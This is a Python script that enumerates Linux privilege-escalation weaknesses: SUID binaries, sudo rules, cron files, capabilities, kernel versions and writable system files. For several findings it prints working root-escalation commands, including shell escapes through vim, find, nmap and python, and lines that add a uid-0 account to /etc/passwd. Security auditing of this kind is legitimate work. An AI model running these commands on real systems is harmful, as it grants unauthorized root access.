#!/usr/bin/env python3
"""
Linux Privilege Escalation Detection Script
Educational tool for authorized security testing only
Based on techniques from the cybersecurity research document
"""

import os
import sys
import subprocess
import stat
import pwd
import grp
import re
import glob
from pathlib import Path

class LinuxPrivEscDetector:
    def __init__(self):
        self.vulnerabilities = []
        self.current_user = os.getenv('USER', 'unknown')
        self.current_uid = os.getuid()
        
    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                    Linux Privilege Escalation Detector                      ║
║                         Educational Purpose Only                             ║
║                    Use only on authorized systems                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """
        print(banner)
        print(f"[*] Running as: {self.current_user} (UID: {self.current_uid})")
        print("=" * 80)

    def run_command(self, command, suppress_errors=True):
        """Execute system command and return output"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout.strip() if result.returncode == 0 else ""
        except Exception as e:
            if not suppress_errors:
                print(f"[!] Error executing command '{command}': {e}")
            return ""

    def check_suid_sgid_binaries(self):
        """Check for SUID and SGID binaries"""
        print("\n[+] Checking SUID/SGID binaries...")
        
        # Find SUID binaries
        suid_command = "find / -perm -4000 -type f 2>/dev/null"
        suid_binaries = self.run_command(suid_command).split('\n')
        
        # Find SGID binaries
        sgid_command = "find / -perm -2000 -type f 2>/dev/null"
        sgid_binaries = self.run_command(sgid_command).split('\n')
        
        # Known exploitable SUID binaries from GTFOBins
        gtfobins_suid = [
            'nmap', 'vim', 'find', 'bash', 'more', 'less', 'nano', 'cp', 'mv',
            'awk', 'man', 'wget', 'ftp', 'gdb', 'strace', 'env', 'python',
            'python2', 'python3', 'perl', 'ruby', 'lua', 'node', 'tar', 'zip'
        ]
        
        exploitable_found = []
        
        for binary in suid_binaries:
            if binary:
                binary_name = os.path.basename(binary)
                if binary_name in gtfobins_suid:
                    exploitable_found.append(binary)
                    print(f"[!] VULNERABLE SUID binary found: {binary}")
                    self.print_gtfobin_exploit(binary_name, "suid")
                else:
                    print(f"[*] SUID binary: {binary}")
        
        for binary in sgid_binaries:
            if binary:
                binary_name = os.path.basename(binary)
                if binary_name in gtfobins_suid:
                    exploitable_found.append(binary)
                    print(f"[!] VULNERABLE SGID binary found: {binary}")
                    self.print_gtfobin_exploit(binary_name, "sgid")
                else:
                    print(f"[*] SGID binary: {binary}")
        
        if exploitable_found:
            self.vulnerabilities.append(f"Exploitable SUID/SGID binaries: {', '.join(exploitable_found)}")

    def print_gtfobin_exploit(self, binary, privilege_type):
        """Print exploitation commands for GTFOBins"""
        exploits = {
            'vim': f"{binary} -c ':!/bin/sh'",
            'find': f"{binary} . -exec /bin/sh \\; -quit",
            'nmap': f"echo 'os.execute(\"/bin/sh\")' > /tmp/shell.nse && {binary} --script=/tmp/shell.nse",
            'awk': f"{binary} 'BEGIN {{system(\"/bin/sh\")}}'",
            'python': f"{binary} -c 'import os; os.system(\"/bin/sh\")'",
            'python2': f"{binary} -c 'import os; os.system(\"/bin/sh\")'",
            'python3': f"{binary} -c 'import os; os.system(\"/bin/sh\")'",
            'bash': f"{binary} -p",
            'cp': f"echo 'user::0:0:user:/root:/bin/bash' > /tmp/passwd && {binary} /tmp/passwd /etc/passwd",
            'env': f"{binary} /bin/sh -p"
        }
        
        if binary in exploits:
            print(f"    [>] Exploit: {exploits[binary]}")

    def check_sudo_privileges(self):
        """Check sudo privileges and misconfigurations"""
        print("\n[+] Checking sudo privileges...")
        
        # Check current sudo privileges
        sudo_l = self.run_command("sudo -l 2>/dev/null")
        if sudo_l:
            print(f"[*] Sudo privileges found:")
            print(sudo_l)
            
            # Check for dangerous sudo configurations
            dangerous_patterns = [
                r'\(ALL.*\)\s*NOPASSWD:\s*ALL',
                r'\(ALL.*\)\s*NOPASSWD:\s*/bin/bash',
                r'\(ALL.*\)\s*NOPASSWD:\s*/bin/sh',
                r'NOPASSWD:\s*/usr/bin/vim',
                r'NOPASSWD:\s*/usr/bin/find',
                r'NOPASSWD:\s*/usr/bin/awk'
            ]
            
            for pattern in dangerous_patterns:
                if re.search(pattern, sudo_l):
                    print(f"[!] VULNERABLE: Dangerous sudo configuration detected!")
                    self.vulnerabilities.append("Dangerous sudo configuration")
                    break

    def check_cron_jobs(self):
        """Check for writable cron jobs and scripts"""
        print("\n[+] Checking cron jobs...")
        
        cron_paths = [
            '/etc/crontab',
            '/etc/cron.d/*',
            '/var/spool/cron/crontabs/*',
            '/etc/cron.hourly/*',
            '/etc/cron.daily/*',
            '/etc/cron.weekly/*',
            '/etc/cron.monthly/*'
        ]
        
        for cron_path in cron_paths:
            try:
                for file_path in glob.glob(cron_path):
                    if os.path.exists(file_path):
                        # Check if file is writable by current user
                        file_stat = os.stat(file_path)
                        if file_stat.st_mode & stat.S_IWOTH or \
                           (file_stat.st_gid in os.getgroups() and file_stat.st_mode & stat.S_IWGRP):
                            print(f"[!] VULNERABLE: Writable cron file: {file_path}")
                            self.vulnerabilities.append(f"Writable cron file: {file_path}")
                        else:
                            print(f"[*] Cron file: {file_path}")
            except Exception:
                continue

    def check_capabilities(self):
        """Check for dangerous Linux capabilities"""
        print("\n[+] Checking Linux capabilities...")
        
        # Find files with capabilities
        getcap_output = self.run_command("getcap -r / 2>/dev/null")
        if getcap_output:
            dangerous_caps = [
                'cap_dac_override',
                'cap_setuid',
                'cap_setgid',
                'cap_sys_admin',
                'cap_sys_ptrace'
            ]
            
            for line in getcap_output.split('\n'):
                if line:
                    print(f"[*] Capability found: {line}")
                    for cap in dangerous_caps:
                        if cap in line.lower():
                            print(f"[!] DANGEROUS capability detected: {line}")
                            self.vulnerabilities.append(f"Dangerous capability: {line}")

    def check_kernel_exploits(self):
        """Check for known kernel exploits"""
        print("\n[+] Checking for kernel exploits...")
        
        kernel_version = self.run_command("uname -r")
        os_info = self.run_command("cat /etc/os-release | grep PRETTY_NAME")
        
        print(f"[*] Kernel version: {kernel_version}")
        print(f"[*] OS info: {os_info}")
        
        # Known kernel exploits (simplified check)
        kernel_exploits = {
            'dirty_cow': {
                'versions': ['3.', '4.0', '4.1', '4.2', '4.3', '4.4', '4.5', '4.6', '4.7', '4.8'],
                'cve': 'CVE-2016-5195',
                'description': 'Dirty COW privilege escalation'
            },
            'overlayfs': {
                'versions': ['3.13', '4.3'],
                'cve': 'CVE-2015-1328',
                'description': 'OverlayFS privilege escalation'
            }
        }
        
        for exploit_name, exploit_info in kernel_exploits.items():
            for version in exploit_info['versions']:
                if version in kernel_version:
                    print(f"[!] POTENTIAL EXPLOIT: {exploit_name}")
                    print(f"    CVE: {exploit_info['cve']}")
                    print(f"    Description: {exploit_info['description']}")
                    self.vulnerabilities.append(f"Kernel exploit: {exploit_name} ({exploit_info['cve']})")

    def check_writable_files(self):
        """Check for important writable files"""
        print("\n[+] Checking for writable sensitive files...")
        
        sensitive_files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/sudoers',
            '/etc/hosts',
            '/etc/crontab'
        ]
        
        for file_path in sensitive_files:
            if os.path.exists(file_path):
                try:
                    if os.access(file_path, os.W_OK):
                        print(f"[!] VULNERABLE: Writable sensitive file: {file_path}")
                        self.vulnerabilities.append(f"Writable sensitive file: {file_path}")
                        
                        if file_path == '/etc/passwd':
                            print("    [>] Exploit: echo 'hacker:$1$salt$password:0:0:root:/root:/bin/bash' >> /etc/passwd")
                    else:
                        print(f"[*] Protected file: {file_path}")
                except Exception:
                    continue

    def check_environment_variables(self):
        """Check for dangerous environment variables"""
        print("\n[+] Checking environment variables...")
        
        dangerous_vars = ['LD_PRELOAD', 'LD_LIBRARY_PATH', 'PYTHONPATH']
        
        for var in dangerous_vars:
            value = os.getenv(var)
            if value:
                print(f"[!] Environment variable {var} is set: {value}")
                self.vulnerabilities.append(f"Dangerous environment variable: {var}")

    def generate_report(self):
        """Generate final vulnerability report"""
        print("\n" + "=" * 80)
        print("[+] VULNERABILITY SUMMARY")
        print("=" * 80)
        
        if self.vulnerabilities:
            print(f"[!] {len(self.vulnerabilities)} potential vulnerabilities found:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"    {i}. {vuln}")
        else:
            print("[+] No obvious vulnerabilities detected.")
        
        print("\n[+] RECOMMENDED ACTIONS:")
        print("    1. Review and fix any identified vulnerabilities")
        print("    2. Keep system updated with latest security patches")
        print("    3. Follow principle of least privilege")
        print("    4. Regular security audits")

    def run_all_checks(self):
        """Run all privilege escalation checks"""
        self.print_banner()
        
        try:
            self.check_suid_sgid_binaries()
            self.check_sudo_privileges()
            self.check_cron_jobs()
            self.check_capabilities()
            self.check_kernel_exploits()
            self.check_writable_files()
            self.check_environment_variables()
            self.generate_report()
            
        except KeyboardInterrupt:
            print("\n[!] Scan interrupted by user")
        except Exception as e:
            print(f"[!] Error during scan: {e}")

def main():
    if os.name != 'posix':
        print("[!] This script is designed for Linux systems only.")
        sys.exit(1)
    
    detector = LinuxPrivEscDetector()
    detector.run_all_checks()

if __name__ == "__main__":
    main()